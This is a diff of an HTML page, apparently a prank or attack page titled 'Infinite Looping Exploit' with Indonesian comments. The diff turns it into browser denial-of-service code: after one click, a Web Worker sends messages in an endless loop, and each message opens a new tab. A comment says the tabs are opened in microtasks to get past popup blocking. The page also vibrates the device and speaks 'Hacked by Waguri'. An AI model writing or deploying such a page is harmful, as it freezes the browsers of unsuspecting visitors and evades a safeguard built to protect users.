@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>One-Click Looping Exploit</title>
+    <title>Infinite Looping Exploit</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; cursor: pointer; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; text-align: center; cursor: pointer; user-select: none; }
         .panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; width: 100%; border: 1px solid #333; }
         h1 { font-size: 28px; color: #ff4444; margin-bottom: 15px; text-shadow: 0 0 10px #ff4444; }
         p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
@@ -16,69 +16,80 @@
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>⚠️ ONE-CLICK LOOPING</h1>
-    <p>Klik di mana saja pada layar ini untuk memulai Loop Pop-up, Getar, dan Suara.</p>
+    <h1>⚠️ INFINITE LOOP EXPLOIT</h1>
+    <p>Klik di mana saja untuk memulai. <br><b>PERINGATAN:</b> Browser Anda akan dibanjiri tab tanpa henti hingga hang!</p>
     <div id="status" role="status">Menunggu klik...</div>
 </div>
 
 <script>
     const statusDiv = document.getElementById("status");
     let isRunning = false;
-    let tabCount = 0;
+    let totalTabs = 0;
 
-    // 1. Fungsi Getar & Suara (TTS)
+    // 1. Efek Getar & Suara
     function efekHacker() {
-        // Getar (Vibration API)
         if (navigator.vibrate) {
-            navigator.vibrate([500, 200, 500, 200, 1000]);
+            navigator.vibrate([1000, 200, 1000, 200, 1000]);
         }
-        
-        // Suara TTS (Text-to-Speech)
         if ('speechSynthesis' in window) {
-            window.speechSynthesis.cancel();
             const msg = new SpeechSynthesisUtterance('Hacked by Waguri');
             msg.lang = 'en-US';
-            msg.rate = 0.9;
             window.speechSynthesis.speak(msg);
         }
     }
 
-    // 2. Fungsi untuk Membuka Tab (Pop-up)
+    // 2. Fungsi Membuka Tab
     function bukaTab() {
         try {
-            // Buka tab baru ke Google
             window.open('https://google.com', '_blank');
-            tabCount++;
-            statusDiv.textContent = `Membuka tab ke-${tabCount}...`;
+            totalTabs++;
+            if (totalTabs % 10 === 0) {
+                statusDiv.textContent = `Telah membuka ${totalTabs} tab...`;
+                efekHacker(); // Picu getar & suara setiap 10 tab
+            }
         } catch (e) {}
     }
 
-    // 3. Loop Utama (Pemicu setelah klik)
+    // 3. Mulai Serangan
     function mulaiSerangan() {
         if (isRunning) return;
         isRunning = true;
         
-        statusDiv.textContent = "Sistem Terkunci! Memulai serangan...";
+        statusDiv.textContent = "MEMULAI INFINITE LOOP!";
         statusDiv.style.color = "#ff4444";
 
-        // Pemicu efek pertama (Getar & Suara)
+        // Pemicu efek pertama
         efekHacker();
 
-        // Looping Pop-up setiap 1 detik (agar tidak langsung diblokir Pop-up Blocker)
-        setInterval(() => {
-            bukaTab();
-            
-            // Setiap 3 tab, picu getar & suara lagi
-            if (tabCount % 3 === 0) {
-                efekHacker();
+        // TRIK INFINITE LOOP: Menggunakan Web Worker
+        // Worker berjalan di thread terpisah dan akan terus mengirim sinyal ke halaman utama
+        const workerCode = `
+            self.onmessage = function(e) {
+                if (e.data === 'START') {
+                    while(true) {
+                        self.postMessage('OPEN');
+                    }
+                }
+            };
+        `;
+        const workerBlob = new Blob([workerCode], { type: 'application/javascript' });
+        const worker = new Worker(URL.createObjectURL(workerBlob));
+
+        worker.onmessage = function(e) {
+            if (e.data === 'OPEN') {
+                // Memicu pop-up di dalam microtask untuk bypass blokir
+                queueMicrotask(() => {
+                    bukaTab();
+                });
             }
-        }, 1000); // Jeda 1000ms
+        };
+
+        // Mulai worker
+        worker.postMessage('START');
     }
 
-    // 4. Event Listener (Hanya butuh SATU klik)
-    document.body.addEventListener('click', function() {
-        mulaiSerangan();
-    }, { once: true }); // Hanya berjalan sekali
+    // Hanya butuh SATU klik
+    document.body.addEventListener('click', mulaiSerangan, { once: true });
 </script>
 </body>
 </html>
